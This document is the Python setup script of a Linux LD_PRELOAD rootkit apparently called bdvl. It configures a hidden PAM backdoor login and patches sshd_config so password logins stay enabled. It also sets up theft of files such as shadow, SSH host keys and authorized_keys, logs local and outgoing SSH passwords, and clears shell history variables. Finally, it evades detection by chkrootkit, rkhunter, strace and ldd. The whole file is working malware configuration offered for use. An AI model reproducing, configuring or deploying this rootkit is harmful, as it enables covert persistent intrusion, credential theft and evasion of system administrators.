#!/usr/bin/env python3


# SETUP.PY SETTINGS

PRINT_ALL_SETTINGS = True

# if there have been changes to etc/.bashrc enable this.
# the new rkbashrc array is written into inc/util/bashrc.h.
# so after, this can be turned back to False.
REWRITE_BASHRC = False

# if there have been changes to etc/.rolf enable this. same
# logic applies as for REWRITE_BASHRC. written to inc/util/magic/rolf.h.
REWRITE_ROLF = False

# END OF SETUP.PY SETTINGS



# ROOTKIT SETTINGS

# if any of these are set to None random garbage takes its place.
BD_UNAME = 'changeme'
BD_PWD   = None
PAM_PORT = None


# the following settings are for patching of /etc/ssh/sshd_config to make sure that our PAM backdoor stays accessible.
# HARD_PATCH_SSHD_CONFIG is the original method. this method makes sure the file itself stays the way we want.
# SOFT_PATCH_SSHD_CONFIG is the better method. when sshd is reading sshd_config, it reads what we say it should read.
HARD_PATCH_SSHD_CONFIG = False
SOFT_PATCH_SSHD_CONFIG = True
PATCH_TARGETS = ['PasswordAuthentication', 'UsePAM']  #  target settings to keep on top of...
ANTIVAL       = ['no', 'no']          # what they shouldn't/can't be.
TARGETVAL     = ['yes', 'yes']        # what they will be now.


# maximum possible magic ID values based on the appropriate data types...
# modern systems handle unsigned ints for ids just fine. only one can be True.
GID_TYPE = {
    4294967294:True,             # unsigned int,
    65534:False,                 # unsigned short,
    18446744073709551614:False,  # unsigned long (idk what if anything supports this...),
    #'1234':True,                # custom
}
READ_GID_FROM_FILE = True   # magic GID value is determined by the contents of a file.
AUTO_GID_CHANGER   = True   # change gid at least every `GID_CHANGE_MINTIME` seconds. (30 min)
GID_CHANGE_MINTIME = 60 * 30


HIDE_MY_ASS      = True     # keep track of hidden things that don't belong to the rootkit. for example something created by you in /tmp. works recursively. initially was for rehiding upon a GID change.
UNINSTALL_MY_ASS = True     # when running `./bdv uninstall`, bdvl will remove all of the hidden paths kept track of by HIDE_MY_ASS. also works recursively.
CLEANSE_HOMEDIR  = True     # remove .bashrc, .profile & symlinks when no rootkit processes are up.


LOG_LOCAL_AUTH = True          # log successful auths for users on the box.
LOG_SSH        = True          # log outgoing ssh login attempts.
LOG_FMT        = '%s (%s)\\n'  # format is '<(ssh )user(@host)> (<password>)\n'



# START OF FILE STEALING STUFF.

FILE_STEAL = True  # if False then nothing below will apply.

# you can also specify paths. wildcards apply..
INTERESTING_FILES  = ['passwd', 'shadow', 'sshd_config', 'ssh_config', 'ssh_host_*_key*',
                      '*.log', 'known_hosts', 'authorized_keys', '*.txt', '*.sql', '*.php',
                      '*.zip', '*.tar', '*.tar.*', '*.rar', '*.db']

# 'can be disabled' means by setting the appropriate value to
# None the certain functionality will be disabled in the rootkit.
# (if it's a list you can also remove everything from the list)

# all files in these directories will be stolen when opened. can be disabled.
INTERESTING_DIRECTORIES = ['/root', '/home']

# when stealing files (from dirs mainly), ignore these filenames. wildcards apply. can be disabled. is by default.
NAMES_BLACKLIST = []

MAX_FILE_SIZE      = (1024 * 1024) * 20    # don't try to steal files bigger than 20mb. memory is allocated in chunks for target files. can be disabled.
FILE_CLEANSE_TIMER = (60 * 60) * 8         # remove stolen files every 8 hours. you may want to change this value...can be disabled.

# this will limit how much stuff can be stored at one time. target files that would put the current total stolen size over this value
# will not be stolen. if SYMLINK_FALLBACK is True then a link will be created in lieu of the copied file. cap of 800mb by default. can be disabled.
MAX_STEAL_SIZE = (1024 * 1024) * 800

# block size settings for reading target files & writing their copies.
BLOCKS_COUNT   = 10         # the default value for how many chunks files contents will be divided into.
MAX_BLOCK_SIZE = 1024 * 32  # if the block size of a target exceeds this value, the block count is incremented until that's no longer the case. 32k default. can be disabled.

# when a. copying the file fails
#     (b. it exceeds MAX_FILE_SIZE)
#     (c. MAX_STEAL_SIZE has been reached)
# link it instead of copying it.
SYMLINK_FALLBACK = True

# chmod the new copy with the target's mode when finished writing it.
KEEP_FILE_MODE = False

# don't write copies of target files. make only symlinks to them.
SYMLINK_ONLY = False

# END OF FILE STEALING STUFF


# patch the dynamic linker libraries as to overwrite the original /etc/ld.so.preload path with our own.
# setting to False will instruct the rootkit to use /etc/ld.so.preload instead.
PATCH_DYNAMIC_LINKER = True


# END OF ROOTKIT SETTINGS


# other random stuff

# bdvl will unset these environment variables in its processes.
unsetvars = ['HISTFILE', 'SAVEHIST', 'TMOUT', 'PROMPT_COMMAND']

# valid package managers available from `./bdv <pkgman>`
validpkgmans = ['apt', 'yum', 'pacman', 'emerge']

# things to hide from. the rootkit is uninstalled during the runtime of either,
#    a. processes with certain environment variables set,
#    b. processes that need to access certain paths,
#    c. or just processes whose names match those below.
scary_variables = ['LD_TRACE_LOADED_OBJECTS', 'LD_DEBUG',
                   'LD_AUDIT']
scary_paths = ['*/*ld-linux*.so.*', '*ld-linux*.so.*',
               '*/*ld-*.so', '*ld-*.so', '*/ld-*.so.*']
scary_procs = ['chkrootkit', 'lsrootkit', 'ldd', 'unhide',
               'rkhunter', 'chkproc', 'chkdirs', 'ltrace',
               'strace']

# valid platforms for target shared object when installing. (`./bdvinstall [path]...`)
valid_platforms = ['x86_64', 'i686', 'v6l', 'v7l']

# `/etc/ld.so.preload` is overwritten in these paths with our own. (PRELOAD_FILE)
# you might have to add new paths in here. that aren't symlinks. check before installing.
# bdvl will ignore links when iterating through this list to patch each.
ldpaths = ['/lib/arm-linux-gnueabihf/ld-2.28.so', '/lib/x86_64-linux-gnu/ld-2.31.so',
           '/lib/i386-linux-gnu/ld-2.31.so', '/lib32/ld-2.31.so', '/lib/ld-2.17.so',
           '/lib64/ld-2.17.so']

# when su'ing to root on PAM backdoor login, the rootkit will make sure one of these shells
# are dropped, in order, if it exists. regardless of the root user's real login shell. or lack thereof.
goodshells = ['/bin/bash', '/bin/sh']

# the root directories of where our stuff will reside. see Util.randpath.
rootdirs = ['/usr', '/etc', '/lib']




from crypt import crypt
from shutil import copytree, copy
from base64 import b64encode
from string import ascii_uppercase, ascii_lowercase, digits
from random import choice
from os import listdir, system, unlink, mkdir
from os.path import join, basename, isdir, dirname
from binascii import hexlify




class Magical():
    def magicmin(self, idmax):
        idmin=int(idmax>>5)
        return idmin

    def magicmax(self):
        keys  = list(GID_TYPE.keys())
        vals  = list(GID_TYPE.values())
        idmax = None

        for i in range(len(GID_TYPE)):
            if vals[i] == True and not idmax == None:
                print('Only one data type for the magic GID can be selected.')
                quit()

            if vals[i] == True:
                idmax = keys[i]

        return idmax

    def maGicalID(self):
        idmax = self.magicmax()
        if idmax == None:
            print('Could not get maximum magic GID. Did you select one?')
            quit()

        idmin = self.magicmin(idmax)
        return choice(range(idmin, idmax))



class Definitions():
    def __init__(self, alist):
        self.array_list = alist
        self.list_len = len(alist)

    # for constant strings...
    def getcdef(self, name, val):
        c_def = '#define {0} "{1}"\n'
        c_def = c_def.format(name, val)
        return c_def

    # or literally anything else.
    def getidef(self, name, val):
        c_def = '#define {0} {1}\n'
        c_def = c_def.format(name, val)
        return c_def

    # returns a new identifier definition based on name & index.
    # where index is the current index of the target array.
    def getident(self, nam, index):
        rlnam = nam.upper()
        ident = '#define C{0} {1}\n'
        ident = ident.format(rlnam, str(index))
        return ident

    # gets all identifiers for data in the target array
    def getidents(self):
        idents = ''
        for i in range(self.list_len):
            our_name = self.array_list[i]
            idents += self.getident(our_name, i)
        return idents


# handy class. trusty class. thank you class.
class CArray(): # default is assumed to be an array of char pointers
    def __init__(self, name, alist, arrtype='char*'):
        self.name = name
        self.sizen = name.upper() + '_SIZE'
        self.list_len = len(alist)
        self.array_list = alist
        self.arrtype = arrtype

        self.typeformat = 'static {0} const {1}[{2}] = '

    # define size of the array to be created.
    def getsizedef(self):
        size_def = '#define {0} {1}\n'
        size_def = size_def.format(self.sizen, self.list_len)
        return size_def

    def declarearray(self):
        return self.typeformat.format(self.arrtype, self.name, self.sizen)

    # build elements of target array.
    def buildelems(self, elems='{'):
        for elem in self.array_list:
            elems += '"{0}",'.format(elem)   \
            if self.arrtype == 'char*'       \
            else '{0},'.format(elem)
        elems = elems[:-1] + '};\n'
        return elems

    # create full C array.
    def create(self):
        result = self.getsizedef()
        result += self.declarearray()
        result += self.buildelems()
        return result


class Util():
    def __init__(self):
        self.usedpaths = []

    # hex the contents of a path & return it as a char array.
    def hexarraylifypath(self, path, arrname):
        fd = open(path, 'rb')
        contents = fd.read()
        fd.close()

        contentshex = hexlify(contents)
        contentslist = ['0x'+str(contentshex[i:i+2].decode('utf-8')) for i in range(0, len(contentshex), 2)]
        contentsarr = CArray(arrname, contentslist, arrtype='char')
        return contentsarr.create()

    def sogetpath(self, instdir, soname):
        return '{0}/{1}.$PLATFORM'.format(instdir, soname)

    def sogetname(self, instdir):
        return 'lib'+basename(instdir)+'.so'

    def randgarb(self, garbset, garblen):
        garb = ''.join(choice(garbset) for _ in range(garblen))
        return garb

    def cryptpw(self, plain):
        salt = self.randgarb(ascii_uppercase+ascii_lowercase+digits, 16)
        hashd = crypt(plain, "$6$"+salt)
        return hashd

    def randpath(self, maxlen):
        randroot = choice(rootdirs)
        randdir = choice(listdir(randroot))

        while len(randdir) < maxlen:
            randdir += self.randgarb(ascii_lowercase, 1)

        while len(randdir) > maxlen:
            randdir = randdir[:-1]

        suffix = self.randgarb(ascii_lowercase, 3)
        newpath = '{0}/{1}{2}'.format(randroot, randdir, suffix)

        if newpath in self.usedpaths or '.' in newpath:
            newpath = self.randpath(maxlen)
        else:
            self.usedpaths.append(newpath)

        return newpath

    def randpaths(self, count):
        allpaths = []
        for i in range(count):
            maxlen = choice(range(4, 8))
            thispath = self.randpath(maxlen)
            allpaths.append(thispath)
        return allpaths




# bunch of settings related stuff...
ut = Util()
m = Magical()

BD_UNAME = ut.randgarb(ascii_lowercase, 7) if BD_UNAME == None else BD_UNAME
BD_PWD = ut.randgarb(ascii_lowercase+ascii_uppercase+digits, 8) if BD_PWD == None else BD_PWD
PAM_PORT = choice(range(11111, 63556)) if PAM_PORT == None else PAM_PORT
bdvlports = [PAM_PORT]

INSTALL_DIR = ut.randpath(7)
BDVLSO = ut.sogetname(INSTALL_DIR)
CLEANEDTIME_PATH = ut.randpath(7) if not FILE_CLEANSE_TIMER == None else None

ALL_HOOKS = []   # stores all the names of hooked functions.
INC, NEW_INC = 'inc', 'new_inc'
CONFIGH      = NEW_INC + '/config.h'
HOOKS_PATH   = NEW_INC + '/hooks/libdl/hooks' # list of everything we're hooking & the libraries they originate from.
SETTINGS_CFG = NEW_INC + '/settings.cfg'      # auto.sh reads BDVLSO from here.



BDVLH = NEW_INC + '/bedevil.h'
SETTINGS = { # all of these are written to bedevil.h. if a value is None it is skipped.
    'BD_UNAME':BD_UNAME,                       'BD_PWD':ut.cryptpw(BD_PWD),
    'MAGIC_GID':m.maGicalID(),                 'BD_VAR':ut.randgarb(ascii_uppercase, 9),
    'INSTALL_DIR':INSTALL_DIR,                 'HOMEDIR':ut.randpath(7),
    'BDVLSO':BDVLSO,                           'SOPATH':ut.sogetpath(INSTALL_DIR, BDVLSO),
    'PRELOAD_FILE':ut.randpath(10),            'SSH_LOGS':ut.randpath(7),
    'INTEREST_DIR':ut.randpath(7),             'HIDEPORTS':ut.randpath(7),
    'GID_PATH':ut.randpath(5),                 'GIDTIME_PATH':ut.randpath(5),
    'PAM_PORT':PAM_PORT,                       'SSHD_CONFIG':'/etc/ssh/sshd_config',
    'LOG_PATH':ut.randpath(7),                 'ASS_PATH':ut.randpath(7),
    'MAX_FILE_SIZE':MAX_FILE_SIZE,             'FILE_CLEANSE_TIMER':FILE_CLEANSE_TIMER,
    'CLEANEDTIME_PATH':CLEANEDTIME_PATH,       'OLD_PRELOAD':'/etc/ld.so.preload',
    'BLOCKS_COUNT':BLOCKS_COUNT,               'MAX_BLOCK_SIZE':MAX_BLOCK_SIZE,
    'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME,   'LOG_FMT':LOG_FMT,
    'MAX_STEAL_SIZE':MAX_STEAL_SIZE,           'MAX_GID':m.magicmax(),
    'MIN_GID':m.magicmin(m.magicmax())
}

print('Username: ' + SETTINGS['BD_UNAME'])
print('Password: ' + BD_PWD)
print('Default hidden port(s): ' + str(bdvlports))
if PRINT_ALL_SETTINGS == False:
    print('Magic environment variable: ' + SETTINGS['BD_VAR'])
    print('Magic GID: ' + str(SETTINGS['MAGIC_GID']))
else: print()


# the following paths are linked to within the installation directory.
# & removed when we aren't logged into the box.
LINKPATHS = {
    SETTINGS['SSH_LOGS']:'ssh_logs',         SETTINGS['HIDEPORTS']:'hide_ports',
    SETTINGS['INTEREST_DIR']:'interest_dir', SETTINGS['LOG_PATH']:'auth_logs',
    SETTINGS['ASS_PATH']:'my_ass',           SETTINGS['INSTALL_DIR']:'install_dir'
}

# these must be checked & based on the values, subsequently written to config.h
# so that the kit knows what stuff to do & what not to do.
CHECKTHESE = {
    'HARD_PATCH_SSHD_CONFIG':HARD_PATCH_SSHD_CONFIG,   'READ_GID_FROM_FILE':READ_GID_FROM_FILE,
    'AUTO_GID_CHANGER':AUTO_GID_CHANGER,               'LOG_LOCAL_AUTH':LOG_LOCAL_AUTH,
    'LOG_SSH':LOG_SSH,                                 'FILE_STEAL':FILE_STEAL,
    'CLEANSE_HOMEDIR':CLEANSE_HOMEDIR,                 'SYMLINK_FALLBACK':SYMLINK_FALLBACK,
    'UNINSTALL_MY_ASS':UNINSTALL_MY_ASS,               'SOFT_PATCH_SSHD_CONFIG':SOFT_PATCH_SSHD_CONFIG,
    'PATCH_DYNAMIC_LINKER':PATCH_DYNAMIC_LINKER,       'KEEP_FILE_MODE':KEEP_FILE_MODE,
    'SYMLINK_ONLY':SYMLINK_ONLY
}

# paths that belong to toggles. here paths suffixed with a '/' are treated as directories
# by the rootkit. upon logging into the backdoor, if these paths do not exist they are
# created. this saves auto.sh some work. stuff here is also rehidden on GID changes.
TOGGLE_PATHS = {
    SETTINGS['SSH_LOGS']:LOG_SSH,                  SETTINGS['GID_PATH']:READ_GID_FROM_FILE,
    SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER,     SETTINGS['LOG_PATH']:LOG_LOCAL_AUTH,
    SETTINGS['ASS_PATH']:HIDE_MY_ASS,              SETTINGS['INTEREST_DIR']+'/':FILE_STEAL
}

NOTRACK = {  # stuff that HIDE_MY_ASS does not need to track.
    '/proc':True,
    SETTINGS['GID_PATH']:READ_GID_FROM_FILE,    SETTINGS['INSTALL_DIR']:True,
    SETTINGS['PRELOAD_FILE']:True,              SETTINGS['OLD_PRELOAD']:True,
    SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER,  SETTINGS['HIDEPORTS']:True,
    SETTINGS['SSH_LOGS']:LOG_SSH,               SETTINGS['INTEREST_DIR']:FILE_STEAL,
    SETTINGS['HOMEDIR']:True,                   SETTINGS['ASS_PATH']:True,
    SETTINGS['CLEANEDTIME_PATH']:True
}

PATCHLISTS = { # stuff for ldpatch
    'patchtargets':PATCH_TARGETS, 'antival':ANTIVAL,
    'targetval':TARGETVAL
}



# read the list of hooked function names from libdl directory &
# create C arrays for them where the contents are referenced by
# the hook() & call() macro wrappers & their functions defined
# in libdl.h.
def gethooks():
    fd = open(HOOKS_PATH, 'r')
    contents = fd.read().split('\n')
    fd.close()

    allhooks = ''
    for line in contents:
        # empty lines or comment lines are of no interest to us.
        if len(line) == 0 or line[0] == '#':
            continue

        # libname:hook1,hook2,hook3,hook4...
        curtoks = line.split(':')
        
        targetlib = curtoks[0]
        targetsyms = curtoks[1]

        # divide all hooked function names into one list.
        hooktoks = targetsyms.split(',')

        # add all of the hooked function names from the current target library into a list for all.
        for curhook in hooktoks:
            ALL_HOOKS.append(curhook)

        # create the C array for the current target lib & the hooked functions
        newarr = CArray(targetlib, hooktoks)
        allhooks += newarr.create()
    return allhooks



def checktoggles(keys, values):
    okhere = ''
    for i in range(len(keys)):
        okhere += '#define {0}\n'.format(keys[i]) \
        if values[i] == True else ''
    return okhere

def writecfg():
    KEYS = list(CHECKTHESE.keys())
    VALUES = list(CHECKTHESE.values())
    with open(CONFIGH, 'a') as fd:
        fd.write(checktoggles(KEYS, VALUES))
        fd.close()


def listconditional(dictlist):
    keys   = list(dictlist.keys())
    values = list(dictlist.values())
    goodkeys = []
    for i in range(len(keys)):
        if values[i] == True:
            goodkeys.append(keys[i])
    return goodkeys



def setup_config():
    if REWRITE_BASHRC == True:
        basharr = ut.hexarraylifypath('etc/.bashrc', 'rkbashrc')
        with open(INC+'/util/magic/bashrc.h', 'w') as fd:
            fd.write(basharr)
            fd.close()

    if REWRITE_ROLF == True:
        with open('etc/.rolf', 'r') as fd:
            rolf = fd.read().strip().split('\n')
            fd.close()
        rolfarr = CArray('rolfs', rolf)
        with open(INC+'/util/magic/rolf.h', 'w') as fd:
            fd.write(rolfarr.create())
            fd.close()


    copytree(INC, NEW_INC)
    writecfg()

    gotbdvlh = gethooks()

    # get all settings & values for bedevil.h
    KEYS   = list(SETTINGS.keys())
    VALUES = list(SETTINGS.values())
    for settingi in range(len(SETTINGS)):
        target = KEYS[settingi]
        value = VALUES[settingi]

        skip = False
        togpathkeys = list(TOGGLE_PATHS.keys())
        togpathvals = list(TOGGLE_PATHS.values())
        for key in togpathkeys:
            if value == key and TOGGLE_PATHS[key] == False:
                skip = True
                break

        if value == None or skip == True:
            continue

        if PRINT_ALL_SETTINGS == True:
            print('\033[1;31m{0}\033[0m: {1}'.format(target, value))

        try:
            gotbdvlh += '#define {0} \"'.format(target) + value + '\"\n'
            gotbdvlh += '#define LEN_{0} {1}\n'.format(target, len(str(value)))
        except:
            gotbdvlh += '#define {0} {1}\n'.format(target, str(value))


    defs = Definitions(ALL_HOOKS)
    gotbdvlh += defs.getidents()

    if FILE_STEAL == True:
        intfilsarr = CArray('interesting_files', INTERESTING_FILES)
        gotbdvlh += intfilsarr.create()

        if not INTERESTING_DIRECTORIES == None and not len(INTERESTING_DIRECTORIES) == 0:
            gotbdvlh += '#define DIRECTORIES_TOO\n'
            intdirsarr = CArray('interesting_directories', INTERESTING_DIRECTORIES)
            gotbdvlh += intdirsarr.create()
            if len(NAMES_BLACKLIST) > 0 and not NAMES_BLACKLIST == None:
                gotbdvlh += '#define BLACKLIST_TOO\n'
                namesarr = CArray('namesblacklist', NAMES_BLACKLIST)
                gotbdvlh += namesarr.create()

    linksrc  = []
    linkdest = []
    KEYS = list(LINKPATHS.keys())
    VALUES = list(LINKPATHS.values())
    for i in range(len(KEYS)):
        linksrc.append(KEYS[i])
        linkdest.append(SETTINGS['HOMEDIR']+'/'+VALUES[i])

    bdvlarrays = { # write all of these lists to bedevil.h as arrays of char pointers
        'linksrcs':linksrc,                 'linkdests':linkdest,
        'unsetvars':unsetvars,              'togpaths':listconditional(TOGGLE_PATHS),
        'notrack':listconditional(NOTRACK), 'validpkgmans':validpkgmans,
        'scary_variables':scary_variables,  'scary_paths':scary_paths,
        'scary_procs':scary_procs,          'valid_platforms':valid_platforms,
        'all':ALL_HOOKS,                    'ldpaths':ldpaths,
        'goodshells':goodshells
    }

    arraynames = list(bdvlarrays.keys())
    targetarrays = list(bdvlarrays.values())
    for i in range(len(arraynames)):
        thisarr = CArray(arraynames[i], targetarrays[i])
        gotbdvlh += thisarr.create()
    gotbdvlh += 'syms symbols[ALL_SIZE];\n'

    bdvlportsarr = CArray('bdvlports', bdvlports, arrtype='int')
    gotbdvlh += bdvlportsarr.create()

    if SOFT_PATCH_SSHD_CONFIG == True or HARD_PATCH_SSHD_CONFIG == True:
        patchkeys = list(PATCHLISTS.keys())
        patchvals = list(PATCHLISTS.values())
        for i in range(len(patchkeys)):
            thisarr = CArray(patchkeys[i], patchvals[i])
            gotbdvlh += thisarr.create()

    # done.
    with open(BDVLH, 'w') as fd:
        fd.write(gotbdvlh)
        fd.close()

    # for auto.sh
    with open(SETTINGS_CFG, 'w') as fd:
        fd.write(SETTINGS['BDVLSO']+'\n')
        fd.close()

    if not isdir('./build'):
        mkdir('./build')

    # mk tar.gz of include dir. b64 it. rm it.
    system('tar cpfz ./build/{0}.tar.gz {1}/'.format(BD_UNAME, NEW_INC))
    with open('./build/'+BD_UNAME+'.tar.gz', 'rb') as fd:
        targzb64 = b64encode(fd.read())
        fd.close()
    unlink('./build/'+BD_UNAME+'.tar.gz')
    
    # write b64.
    with open('./build/'+BD_UNAME+'.b64', 'wb') as fd:
        fd.write(targzb64)
        fd.close()




if __name__ == '__main__':
    setup_config()
    template = 'sh etc/ssh.sh {0} <host> {1} # {2}'.format(BD_UNAME, str(PAM_PORT), BD_PWD)
    print('\n\t\033[1;31m{0}\033[0m\n'.format(template))

